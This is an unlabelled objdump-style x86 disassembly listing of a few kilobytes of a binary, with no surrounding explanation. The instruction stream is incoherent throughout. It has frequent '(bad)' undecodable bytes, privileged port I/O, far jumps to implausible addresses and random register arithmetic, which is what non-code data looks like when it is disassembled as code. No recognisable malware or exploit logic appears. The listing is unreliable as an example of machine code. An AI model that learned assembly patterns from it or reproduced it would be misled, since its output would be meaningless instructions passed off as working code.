  431f86:	add    DWORD PTR [esi],eax
  431f88:	rol    DWORD PTR [ebp+0x8],0x29
  431f8c:	mov    esp,eax
  431f8e:	clc    
  431f8f:	jne    0x432006
  431f91:	mov    eax,0x8b0673
  431f96:	loopne 0x431fdd
  431f98:	loopne 0x431f23
  431f9a:	lods   al,BYTE PTR ds:[esi]
  431f9b:	int3   
  431f9c:	inc    ebp
  431f9d:	mov    DWORD PTR gs:[eax+edi*8],eax
  431fa1:	add    al,0xc3
  431fa3:	sub    ecx,DWORD PTR [ebp+0x47]
  431fa6:	(bad)  
  431fa8:	shr    BYTE PTR [ebp-0x1f],0xe8
  431fac:	add    eax,DWORD PTR [eax]
  431fae:	call   0x644e0b3
  431fb3:	add    esi,DWORD PTR [esi-0x3b2efc83]
  431fb9:	dec    esi
  431fba:	ins    DWORD PTR es:[edi],dx
  431fbb:	in     al,dx
  431fbc:	lea    eax,[eax]
  431fbe:	inc    ebp
  431fbf:	inc    ebp
  431fc0:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431fc6:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431fd0:	and    al,0xdc
  431fd2:	ror    DWORD PTR [edx+0x24],0xf7
  431fd6:	or     BYTE PTR [ebp+0x4c],dh
  431fd9:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431fdd:	stos   BYTE PTR es:[edi],al
  431fde:	adc    edx,edi
  431fe0:	inc    esp
  431fe1:	add    edi,DWORD PTR [eax]
  431fe3:	jne    0x431fc8
  431fe5:	mov    DWORD PTR [eax-0x7449db04],ecx
  431feb:	cmp    ecx,DWORD PTR [edi]
  431fed:	sub    BYTE PTR [ebp-0x7e],dl
  431ff0:	sar    ebp,0xb
  431ff3:	jmp    FWORD PTR [edi+0x2400392a]
  431ff9:	sub    esi,DWORD PTR [ebx-0x73]
  431ffc:	mov    esp,DWORD PTR [ecx+edi*4]
  431fff:	mov    ecx,DWORD PTR [eax]
  432001:	and    BYTE PTR [eax],al
  432003:	jne    0x431fcf
  432005:	sub    ebp,ecx
  432007:	sbb    BYTE PTR [esi+0x32],ah
  43200a:	dec    ebp
  43200b:	push   ebp
  43200c:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  432012:	ret    
  432013:	mov    edx,ebp
  432015:	leave  
  432016:	sub    DWORD PTR [esi+0x24],ebx
  432019:	ret    0x2b
  43201c:	pop    ax
  43201e:	push   ebp
  43201f:	rol    BYTE PTR [ebx],0xeb
  432022:	add    DWORD PTR [ecx+0x6c0001],0x40
  432029:	jb     0x432080
  43202b:	ret    
  43202c:	in     al,dx
  43202d:	jecxz  0x431fba
  43202f:	push   esi
  432030:	xchg   esp,eax
  432031:	jne    0x432033
  432033:	cmp    edx,DWORD PTR [esi+0x1c]
  432036:	jne    0x43201c
  432038:	mov    eax,DWORD PTR [ebp-0x77]
  43203b:	ror    DWORD PTR [ebx+0x899408],0xe0
  432042:	mov    esi,DWORD PTR [ebp-0x75]
  432045:	pop    esi
  432046:	nop
  432047:	mov    eax,DWORD PTR [eax]
  432049:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  43204f:	add    al,0x0
  432051:	inc    ebp
  432052:	mov    eax,DWORD PTR [ebx]
  432054:	mov    ebp,ebx
  432056:	cmp    al,0xf
  432058:	or     al,al
  43205a:	inc    ebp
  43205b:	inc    ebp
  43205c:	mov    ebx,DWORD PTR ss:[eax+ecx*8+0xfc6c8b]
  432064:	mov    bh,0xc0
  432066:	push   ss
  432067:	ins    BYTE PTR es:[edi],dx
  432068:	push   ecx
  432069:	add    BYTE PTR [ecx-0x5],dl
  43206c:	add    eax,0x17200
  432071:	sbb    al,0x85
  432073:	dec    esp
  432074:	je     0x4320ae
  432076:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  43207a:	add    BYTE PTR [ebx],bh
  43207c:	(bad)  
  43207d:	and    al,0x39
  43207f:	jae    0x43201d
  432081:	mov    cl,cl
  432083:	inc    DWORD PTR [esp]
  432086:	push   ebp
  432087:	shr    esp,0x8
  43208a:	in     al,dx
  43208b:	push   esp
  43208c:	add    DWORD PTR [eax],esp
  43208e:	add    bl,cl
  432090:	inc    ebp
  432091:	mov    bh,0x89
  432093:	add    ah,bh
  432095:	jmp    0xca7c2fdf
  43209a:	pushf  
  43209b:	dec    esp
  43209c:	mov    edx,0xf8178520
  4320a1:	fst    DWORD PTR [ebp+0x0]
  4320a4:	mov    BYTE PTR [eax],0xc4
  4320a7:	sub    edx,DWORD PTR [ebx-0x3f]
  4320aa:	inc    ebp
  4320ab:	add    eax,0xc601da
  4320b0:	mov    al,0xc6
  4320b3:	ins    BYTE PTR es:[edi],dx
  4320b4:	mov    DWORD PTR [eax+0x57],0x280545c1
  4320bb:	dec    esp
  4320bc:	jmp    DWORD PTR [eax]
  4320be:	inc    ebp
  4320bf:	fnstcw WORD PTR [esi+0x29]
  4320c2:	test   BYTE PTR [eax],0xc6
  4320c5:	rol    BYTE PTR [eax],0xc0
  4320c8:	lea    ecx,[ebp-0x3cf0dbcb]
  4320ce:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4320d4:	inc    esi
  4320d5:	add    DWORD PTR [eax],ebx
  4320d7:	add    dh,bh
  4320d9:	mov    esi,DWORD PTR [edx+0x8]
  4320dc:	(bad)  
  4320dd:	fdiv   QWORD PTR ss:[ecx]
  4320e0:	(bad)  
  4320e1:	mov    bl,ch
  4320e3:	add    esi,eax
  4320e5:	add    dh,bl
  4320e7:	or     esi,eax
  4320e9:	mov    dl,0xdf
  4320eb:	add    esi,eax
  4320ed:	add    al,ah
  4320ef:	push   cs
  4320f0:	mov    BYTE PTR [edx+0xc601e1],0xe2
  4320f7:	or     BYTE PTR [ebx],dh
  4320f9:	dec    ecx
  4320fa:	lea    eax,[ebx]
  4320fc:	xor    eax,0x18fc0fc7
  432101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432102:	repz clc 
  432104:	add    eax,DWORD PTR [ebp+0x46]
  432107:	prefetcht0 BYTE PTR [ecx-0x2]
  43210b:	xor    eax,0x7c60872
  432110:	mov    esp,0xbd32c699
  432115:	pop    esi
  432116:	mov    cl,0xbe
  432119:	or     al,0xc6
  43211b:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  432122:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  432129:	add    dh,al
  43212b:	mov    eax,ebx
  43212d:	xor    DWORD PTR [ebx],0x35008dbc
  432133:	mov    ecx,DWORD PTR [edi]
  432135:	sbb    al,0x18
  432137:	inc    ebp
  432138:	xrelease mov DWORD PTR [ebx],0x188546f4
  43213f:	clc    
  432140:	(bad)  
  432141:	ss jb  0x4320e0
  432144:	lea    ecx,[ecx+0x45ffe838]
  43214a:	mov    ebp,esp
  43214c:	fadd   st,st(6)
  43214e:	dec    ebp
  43214f:	lds    edi,FWORD PTR [eax+0x7145fc56]
  432155:	out    0x1,eax
  432157:	inc    ebp
  432158:	lea    ebp,[ecx]
  43215a:	inc    esi
  43215c:	dec    eax
  43215e:	enter  0xa33,0xc6
  432162:	push   ebp
  432163:	leave  
  432164:	(bad)  
  432165:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  43216b:	add    BYTE PTR [ebp+0x44],al
  43216e:	mov    eax,esp
  432170:	mov    WORD PTR [esi+0x44398300],?
  432176:	psubusw mm4,QWORD PTR [eax-0x78]
  43217a:	add    BYTE PTR [ebx-0x1303f975],al
  432180:	add    BYTE PTR [ebp+0x1],0xeb
  432184:	add    BYTE PTR [ebp+0x38],al
  432187:	jmp    0xdbce66d1
  43218c:	add    BYTE PTR [ebp+0x0],0xe8
  432190:	mov    DWORD PTR [ebp-0x48],eax
  432193:	sub    DWORD PTR [edi+0x45],ecx
  432196:	add    BYTE PTR [eax],ch
  432198:	js     0x4321df
  43219a:	data16 jle 0x432122
  43219d:	idiv   bh
  43219f:	inc    esp
  4321a0:	(bad)  
  4321a1:	fadd   st(7),st
  4321a3:	mov    dh,0x89
  4321a5:	and    DWORD PTR [esi+0x44],0xffffffff
  4321a9:	fld    DWORD PTR [ebx-0x767cbc78]
  4321af:	pop    es
  4321b0:	push   0x8d45ffec
  4321b5:	jmp    0xe6cc66bd
  4321ba:	push   0x45
  4321bc:	jmp    edx
  4321be:	add    DWORD PTR [ebp+0xd],0xfffffff5
  4321c2:	mov    DWORD PTR [ebp+0x6c],eax
  4321c5:	(bad)  
  4321c7:	inc    ebp
  4321c8:	(bad)  
  4321c9:	out    dx,al
  4321ca:	add    al,0x45
  4321cc:	mov    edi,esp
  4321ce:	outs   dx,BYTE PTR ds:[esi]
  4321cf:	inc    ebp
  4321d0:	(bad)  
  4321d1:	jle    0x432156
  4321d3:	idiv   BYTE PTR ds:0x70bc8944
  4321d9:	mov    dh,0xff
  4321db:	or     DWORD PTR [ebp-0x762609bc],0xffffff88
  4321e2:	jb     0x432167
  4321e4:	dec    DWORD PTR [eax]
  4321e6:	mov    ebp,esp
  4321e8:	test   WORD PTR [ebp-0x1],ax
  4321ef:	inc    ebp
  4321f0:	ror    BYTE PTR [ebx-0x137a279a],0xff
  4321f7:	adc    edi,edi
  4321f9:	mov    ebp,edi
  4321fb:	mov    eax,DWORD PTR [eax]
  4321fd:	cmp    BYTE PTR [esi-0x1],ah
  432200:	test   DWORD PTR [ebx],edi
  432202:	push   DWORD PTR [ebp-0x1]
  432205:	mov    DWORD PTR [esi-0x48],ebp
  432208:	add    BYTE PTR [ebp+0x66],al
  43220b:	jmp    0x432192
  43220d:	pushf  
  43220e:	dec    DWORD PTR [ebx-0x7f940301]
  432214:	add    BYTE PTR [ecx],al
  432216:	data16 add BYTE PTR [ebp-0x7a00c8],al
  43221d:	add    al,al
  43221f:	add    BYTE PTR [esi+0x45],ah
  432222:	test   DWORD PTR [ebx+0xff7cff],ecx
  432228:	inc    eax
  432229:	mov    DWORD PTR [eax],eax
  43222b:	mov    esp,DWORD PTR [esi-0x4]
  43222e:	inc    ebp
  43222f:	cmp    BYTE PTR [eax+0x4701],0x38
  432236:	mov    DWORD PTR [ebp-0x7e],ebp
  432239:	add    BYTE PTR [edi-0x73],al
  43223c:	push   0xffffffcd
  43223e:	mov    WORD PTR [ebp+0x64],ax
  432242:	(bad)  
  432243:	call   eax
  432245:	mov    esp,esi
  432247:	data16 cmc 
  432249:	test   DWORD PTR [ebp-0x1],eax
  43224c:	(bad)  
  43224e:	out    0xc0,eax
  432250:	lea    esp,[esi-0x30]
  432253:	test   DWORD PTR [edx+0x44ff80ff],ecx
  432259:	inc    edi
  43225a:	jmp    0x75ff:0x40858866
  432261:	dec    DWORD PTR [ebp-0x7a992f40]
  432267:	test   esi,edi
  432269:	(bad)  
  43226a:	(bad)  
  43226b:	inc    DWORD PTR [ebp-0x9901b9]
  432271:	test   DWORD PTR [ebx+0x51fff4ff],ecx
  432277:	rcl    BYTE PTR [ecx+0x66],0x33
  43227b:	test   DWORD PTR [ebx+0xff72ff],edi
  432281:	inc    edi
  432282:	ret    
  432283:	mov    ax,WORD PTR [ebp-0x3f0004]
  43228a:	push   eax
  43228b:	mov    DWORD PTR [ebp-0x77],0xff98748b
  432292:	add    BYTE PTR [ebx-0x764f0839],al
  432298:	push   DWORD PTR [esi+0x1]
  43229b:	inc    DWORD PTR [eax]
  43229d:	mov    eax,0xff99ff
  4322a2:	or     BYTE PTR [ecx-0x7a87bb],cl
  4322a8:	jne    0x432262
  4322aa:	add    DWORD PTR [edx-0x76edff74],0xff707a8d
  4322b4:	mov    ecx,0xd74fb8
  4322b9:	add    cl,al
  4322bb:	mov    DWORD PTR [ecx-0x3f007784],ecx
  4322c1:	or     DWORD PTR [ebx+0x558966e4],0x7e
  4322c8:	(bad)  
  4322c9:	(bad)  
  4322ca:	std    
  4322cb:	mov    eax,0x8c2789
  4322d0:	ret    0x6689
  4322d3:	adc    BYTE PTR [ebp+0x40],0x8d
  4322d7:	add    bh,ah
  4322d9:	mov    WORD PTR [ebp-0x70],ax
  4322dd:	(bad)  
  4322de:	ret    0x6605
  4322e1:	or     BYTE PTR [ebp-0x77],dl
  4322e4:	lea    eax,[ecx+eiz*8-0x6b1676bb]
  4322eb:	loop   0x432276
  4322ed:	(bad)  
  4322ee:	xchg   esi,eax
  4322ef:	aam    0xcf
  4322f1:	out    dx,al
  4322f2:	mov    DWORD PTR [esi-0x68],edi
  4322f5:	inc    ebp
  4322f6:	dec    edx
  4322f7:	pop    ecx
  4322f8:	mov    edx,DWORD PTR [eax]
  4322fa:	repnz push bp
  4322fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432304:	(bad)  
  432305:	repnz cmp eax,0xa0898945
  43230b:	mov    ah,0x89
  43230d:	jmp    DWORD PTR [edx+0x66b0418d]
  432313:	inc    DWORD PTR [ebp+0x50]
  432316:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43231a:	mov    DWORD PTR [eax],ecx
  43231c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43231d:	pop    es
  43231e:	inc    ecx
  43231f:	(bad)  
  432320:	cwd    
  432322:	inc    ebp
  432323:	xor    ah,BYTE PTR [esi+0x3]
  432326:	dec    ebp
  432327:	push   eax
  432328:	inc    bp
  43232a:	jge    0x4322af
  43232c:	mov    esp,DWORD PTR [esi-0x18]
  43232f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432335:	add    DWORD PTR [ebx],esi
  432337:	add    BYTE PTR [ebx],al
  432339:	test   DWORD PTR [ebx],esi
  43233b:	(bad)  
  43233c:	inc    WORD PTR [ebp+0x0]
  432340:	mov    eax,DWORD PTR [eax]
  432342:	call   0x8898da77
  432347:	mov    esi,eax
  432349:	clc    
  43234a:	ret    
  43234b:	rol    cl,0xa
  43234e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432354:	mov    edx,edi
  432356:	pushf  
  432357:	pop    es
  432358:	jmp    DWORD PTR [edx+0x66]
  43235b:	add    BYTE PTR [ebp-0x990175],al
  432361:	inc    ebp
  432362:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432368:	push   ebp
  432369:	mov    edi,eax
  43236b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432371:	push   ebp
  432372:	add    BYTE PTR [ebx-0x764b0777],al
  432378:	dec    DWORD PTR [esi+0x661851e8]
  43237e:	add    BYTE PTR [ebp-0x7b],dl
  432381:	cmp    esi,0x3
  432384:	dec    DWORD PTR [ecx+0x51fe9285]
  43238a:	jmp    DWORD PTR [esi-0x75]
  43238d:	push   ebp
  43238e:	hlt    
  43238f:	data16 (bad) 
  432391:	dec    ebp
  432392:	ret    
  432393:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432399:	lea    edx,[eax-0x1]
  43239c:	jne    0x43236f
  43239e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4323a4:	dec    BYTE PTR [ecx+0x51559eff]
  4323aa:	mov    DWORD PTR [esi-0x4c],esp
  4323ad:	push   ebp
  4323ae:	jmp    DWORD PTR [esi-0x18]
  4323b1:	inc    ebp
  4323b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4323b8:	(bad)  
  4323b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4323ba:	inc    eax
  4323bc:	test   DWORD PTR [esi-0x2],esp
  4323bf:	inc    ebp
  4323c0:	dec    DWORD PTR [ebp-0x760bde75]
  4323c6:	(bad)  
  4323c7:	test   al,0xc3
  4323c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4323cf:	lods   al,BYTE PTR ds:[esi]
  4323d0:	push   eax
  4323d1:	inc    ebp
  4323d2:	jne    0x4323e3
  4323d4:	dec    DWORD PTR [ebp+0x8]
  4323d7:	mov    eax,DWORD PTR [edi]
  4323d9:	sbb    al,0x0
  4323db:	(bad)  
  4323dc:	mov    eax,0xc14fc3
  4323e1:	mov    DWORD PTR [eax-0x64],edi
  4323e4:	inc    bp
  4323e6:	test   DWORD PTR [edi],ecx
  4323e8:	dec    DWORD PTR [ebp-0x1]
  4323eb:	xor    eax,edi
  4323ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4323f3:	inc    ebp
  4323f4:	xor    DWORD PTR [ebx],0x43
  4323f7:	mov    WORD PTR [ebp-0x1bc],ax
  4323fe:	lea    ecx,[ecx-0x7677fe]
  432404:	inc    esi
  432405:	(bad)  
  432406:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43240d:	pushf  
  43240e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432415:	add    bh,bh
  432417:	add    BYTE PTR [edi],cl
  432419:	test   DWORD PTR [eax],eax
  43241b:	(bad)  
  43241c:	dec    WORD PTR [ebp-0xff002d]
  432423:	mov    DWORD PTR [eax-0x48],esi
  432426:	add    bh,bh
  432428:	lea    cx,[ebp-0x50]
  43242f:	push   eax
  432430:	rol    BYTE PTR [ebp+0x0],1
  432433:	xor    esp,DWORD PTR [esi+0x3]
  432436:	lea    edx,[eax-0x1]
  432439:	test   edi,edi
  43243b:	dec    DWORD PTR [ebp-0x1]
  43243e:	mov    edi,edi
  432440:	dec    eax
  432441:	clc    
  432442:	call   DWORD PTR [ebp-0x73]
  432445:	lea    esi,[eax+0x51ffff88]
  43244b:	lea    ecx,[ebp-0x78]
  43244e:	test   WORD PTR [ebp-0x2],ax
  432455:	popf   
  432456:	push   ecx
  432457:	add    BYTE PTR [ecx-0x77],dl
  43245a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432460:	cdq    
  432461:	mov    al,0x32
  432463:	inc    DWORD PTR [ebx]
  432465:	push   eax
  432466:	push   ecx
  432467:	inc    ebp
  432468:	shl    BYTE PTR [ebx],1
  43246a:	lea    eax,[ebx]
  43246c:	call   DWORD PTR [eax-0x1]
  43246f:	test   DWORD PTR [ebx],esi
  432471:	inc    DWORD PTR [eax-0x1]
  432474:	(bad)  
  432475:	(bad)  
  432476:	(bad)  
  432477:	clc    
  432478:	call   DWORD PTR [ebp+0x50]
  43247b:	jmp    0xcc25f5
  432480:	inc    esp
  432481:	jae    0x432482
  432483:	add    BYTE PTR [ecx-0x384f73],cl
  432489:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43248f:	mov    eax,DWORD PTR [ecx]
  432491:	data16 add BYTE PTR [ebp-0xb50077],al
  432498:	inc    eax
  43249a:	lea    esp,[esi+0x1c]
  43249d:	test   DWORD PTR [ecx-0xb301],ecx
  4324a3:	inc    edi
  4324a4:	(bad)  
  4324a5:	dec    si
  4324a7:	test   edi,edi
  4324a9:	push   DWORD PTR [ecx]
  4324ab:	(bad)  
  4324ac:	jnp    0x4324fd
  4324ae:	(bad)  
  4324af:	mov    edx,DWORD PTR [edx-0x7d]
  4324b2:	(bad)  
  4324b3:	mov    ebx,0x563a8935
  4324b8:	(bad)  
  4324b9:	call   FWORD PTR [esi-0x47]
  4324bc:	inc    DWORD PTR ds:0x893000e2
  4324c2:	(bad)  
  4324c3:	pop    eax
  4324c4:	mov    ah,0xff
  4324c6:	(bad)  
  4324c7:	mov    ecx,0x5745
  4324cc:	dec    DWORD PTR [ecx-0xf7a501]
  4324d2:	(bad)  
  4324d3:	mov    ecx,0x456108
  4324d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4324de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4324e4:	inc    BYTE PTR gs:[eax]
  4324e7:	inc    DWORD PTR [ebp-0x73]
  4324ea:	ss (bad) 
  4324ec:	pushf  
  4324ed:	inc    edi
  4324ef:	mov    ebx,eax
  4324f1:	hlt    
  4324f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4324f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4324fe:	lock into 
  432500:	test   eax,eax
  432502:	clc    
  432503:	mov    ebx,0x367245
  432508:	lahf   
  432509:	retf   
  43250a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432510:	add    edi,edi
  432512:	add    BYTE PTR [ecx+0x45],dl
  432515:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43251c:	mov    edx,DWORD PTR [ecx-0x74]
  43251f:	inc    DWORD PTR [eax]
  432521:	cld    
  432522:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432528:	add    BYTE PTR [ebp-0x1b0177],al
  43252e:	jge    0x432575
  432530:	test   DWORD PTR [ebx+0xff9875],ecx
  432536:	sbb    BYTE PTR [esi+0x55],ah
  432539:	xchg   ebp,eax
  43253a:	call   0x43203e
  43253f:	push   edi
  432540:	inc    ebp
  432541:	mov    dx,WORD PTR [ebp-0xfc0075]
  432548:	cmp    al,0x85
  43254a:	ud0    eax,DWORD PTR [ebp-0x1]
  43254e:	test   DWORD PTR [edi+0x74],ecx
  432551:	dec    edi
  432552:	inc    DWORD PTR [ebp-0xf70004]
  432558:	dec    DWORD PTR [edi-0x75]
  43255b:	dec    edi
  43255c:	cld    
  43255d:	test   DWORD PTR [eax+0xff01ff],eax
  432563:	icebp  
  432564:	add    BYTE PTR [edi-0x3a],cl
  432567:	test   ebx,eax
  432569:	inc    BYTE PTR [ebp-0x1]
  43256c:	jne    0x43256e
  43256e:	mov    eax,DWORD PTR [eax]
  432570:	cld    
  432571:	xor    BYTE PTR [ecx+0x500155],cl
  432577:	push   ebp
  432578:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43257e:	add    BYTE PTR [ebp+0x35e90f50],al
  432584:	add    al,BYTE PTR [eax]
  432586:	add    BYTE PTR [ebx-0x38fe4f80],al
  43258c:	add    ah,ch
  43258e:	or     BYTE PTR [ebp+0x4501f845],dh
  432594:	jmp    0xdf288f
  432599:	(bad)  
  43259a:	nop    ecx
  43259d:	test   DWORD PTR [ebp+0x4502f8],eax
  4325a3:	cmp    BYTE PTR [ebp-0x64],cl
  4325a6:	mov    eax,edi
  4325a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4325ab:	add    eax,0x45fef885
  4325b0:	dec    DWORD PTR [ebx+0x339445]
  4325b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4325bc:	dec    DWORD PTR [ebx-0x460f0375]
  4325c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4325c3:	add    esi,edi
  4325c5:	add    bh,bh
  4325c7:	rdpmc  
  4325c9:	add    BYTE PTR [ebx],0x1
  4325cc:	mov    DWORD PTR [eax],eax
  4325ce:	add    al,0x45
  4325d0:	dec    DWORD PTR [ecx-0x360b3373]
  4325d6:	dec    DWORD PTR [esi]
  4325d8:	push   eax
  4325d9:	jne    0x432620
  4325db:	mov    esi,DWORD PTR [ebx]
  4325dd:	cld    
  4325de:	add    ebp,ebx
  4325e0:	push   eax
  4325e1:	inc    DWORD PTR [ebp-0x75]
  4325e4:	add    eax,0x800e4
  4325e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4325ef:	mov    DWORD PTR [ecx],eax
  4325f1:	sbb    al,0x0
  4325f3:	leave  
  4325f4:	test   DWORD PTR [edi-0x2],eax
  4325f7:	jne    0x4325f8
  4325f9:	call   0xff4410fe
  4325fe:	xor    BYTE PTR [ebp+0x4d],al
  432601:	mov    edi,edi
  432603:	enter  0x8,0x4d
  432607:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43260d:	mov    eax,DWORD PTR [eax]
  43260f:	cld    
  432610:	add    DWORD PTR [ecx],ebx
  432612:	inc    ebp
  432613:	dec    ebp
  432614:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43261a:	inc    eax
  43261b:	dec    DWORD PTR [ecx-0x270375]
  432621:	add    BYTE PTR [ebx-0x39d72701],cl
  432627:	xchg   ecx,eax
  432628:	ret    
  432629:	add    BYTE PTR [ebp-0x830075],al
  43262f:	add    BYTE PTR [ebp-0x75],al
  432632:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432638:	lea    edi,[edi-0xc]
  43263b:	add    bh,bh
  43263d:	mov    edx,DWORD PTR [eax-0x7b]
  432640:	inc    ebp
  432641:	rdpmc  
  432643:	jne    0x432648
  432645:	add    BYTE PTR [eax-0x75],dl
  432648:	inc    ebp
  432649:	clc    
  43264a:	add    eax,0x400009
  43264f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432655:	mov    eax,DWORD PTR [ecx]
  432657:	in     al,dx
  432658:	add    dh,al
  43265a:	test   ebx,eax
  43265c:	inc    BYTE PTR [ebp-0xff0001]
  432662:	add    BYTE PTR [ebp-0x43],al
  432665:	cmp    esi,0xfffffff8
  432668:	(bad)  
  432669:	push   DWORD PTR [eax]
  43266b:	add    BYTE PTR [ebp-0x3a],dl
  43266e:	test   ebx,eax
  432670:	je     0x4325f7
  432672:	mov    edi,edi
  432674:	sbb    al,0xff
  432676:	test   DWORD PTR gs:[eax],eax
  432679:	(bad)  
  43267a:	js     0x43267b
  43267c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432682:	sub    eax,ebx
  432684:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43268a:	add    eax,DWORD PTR [eax]
  43268c:	dec    ebp
  43268d:	push   eax
  43268e:	mov    al,BYTE PTR [ebp+0x1]
  432691:	mov    eax,DWORD PTR [ebp-0x68]
  432694:	mov    eax,DWORD PTR [eax]
  432696:	sbb    bh,al
  432698:	or     ah,dh
  43269a:	dec    ebp
  43269b:	inc    DWORD PTR [eax+0x4]
  43269e:	push   ecx
  43269f:	add    BYTE PTR [edx-0x1],dh
  4326a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4326a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4326b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4326b8:	push   ecx
  4326b9:	cmp    BYTE PTR [ebx],al
  4326bb:	inc    ebp
  4326bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4326c2:	(bad)  
  4326c3:	(bad)  
  4326c4:	in     al,0xff
  4326c6:	add    BYTE PTR [ebp+0x0],al
  4326c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4326cf:	add    al,bh
  4326d1:	(bad)  
  4326d2:	jmp    0x8d85:0x74b0558d
  4326d9:	dec    DWORD PTR [eax]
  4326db:	call   DWORD PTR [ebp-0x7b]
  4326de:	mov    edi,esi
  4326e0:	lock call DWORD PTR [ebp-0x75]
  4326e4:	mov    esi,esp
  4326e6:	mov    ah,0xc6
  4326e8:	mov    bh,0xc3
  4326ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4326f0:	add    DWORD PTR [eax],0x450050ff
  4326f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4326fc:	inc    edi
  4326fe:	push   esp
  432700:	jmp    0xcd00:0x670481ff
  432707:	mov    DWORD PTR [ebx],esi
  432709:	clc    
  43270a:	cmp    edi,0xff9cff3b
  432710:	jne    0x43271a
  432712:	mov    eax,eax
  432714:	add    esi,DWORD PTR [eax]
  432716:	int3   
  432717:	inc    ebp
  432718:	cmp    al,0x83
  43271a:	add    BYTE PTR [eax],bl
  43271c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432722:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432728:	mov    edi,eax
  43272a:	cmp    BYTE PTR [ebp+0x45],cl
  43272d:	jmp    0x4326ba
  43272f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432732:	inc    ebp
  432733:	or     al,0x2
  432735:	dec    DWORD PTR [ebp+0x18]
  432738:	jne    0x43278f
  43273a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432740:	mov    edi,DWORD PTR [ebx]
  432742:	in     al,0x50
  432744:	xchg   ecx,eax
  432745:	jmp    0x343764a
  43274a:	adc    al,0x8b
  43274c:	inc    ebp
  43274d:	mov    al,ds:0x8b04008b
  432752:	push   ebp
  432753:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432759:	push   ebp
  43275a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432760:	inc    ebp
  432761:	dec    ebp
  432762:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432768:	mov    DWORD PTR [eax],0xe9ff00f4
  43276e:	add    al,0x0
  432770:	add    BYTE PTR [eax],al
  432772:	mov    eax,edx
  432774:	push   eax
  432775:	rol    DWORD PTR [ebp-0xf0177],1
  43277b:	bound  eax,QWORD PTR [ebp+0x50]
  43277e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432784:	add    BYTE PTR [ecx+0x558df0ff],cl
  43278a:	mov    al,0xf
  43278c:	test   DWORD PTR [edx],edx
  43278e:	call   DWORD PTR [ebp-0x7a0001]
  432794:	(bad)  
  432795:	loop   0x432796
  432797:	jnp    0xc6991b9d
  43279d:	mov    eax,ebx
  43279f:	cmp    al,0x8b
  4327a1:	(bad)  
  4327a2:	cld    
  4327a3:	shr    esi,0xc
  4327a6:	add    dl,al
  4327a8:	push   eax
  4327a9:	lea    eax,[ebp-0x1]
  4327ac:	mov    edx,esi
  4327ae:	cwde   
  4327af:	cli    
  4327b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4327b6:	or     BYTE PTR [eax],cl
  4327b8:	inc    ebp
  4327b9:	dec    ebp
  4327ba:	inc    DWORD PTR [ebx+0x74803914]
  4327c0:	add    DWORD PTR [ebx+0x451800],ecx
  4327c6:	call   DWORD PTR [eax+edx*1]
  4327c9:	add    ecx,DWORD PTR [ebp-0x34]
  4327cc:	push   edi
  4327cd:	adc    al,0x8
  4327cf:	mov    edx,DWORD PTR [ebp-0x14]
  4327d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4327d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4327d9:	inc    DWORD PTR [eax+esi*8]
  4327dc:	inc    ebp
  4327dd:	stos   BYTE PTR es:[edi],al
  4327de:	mov    edx,DWORD PTR [ebp-0x4]
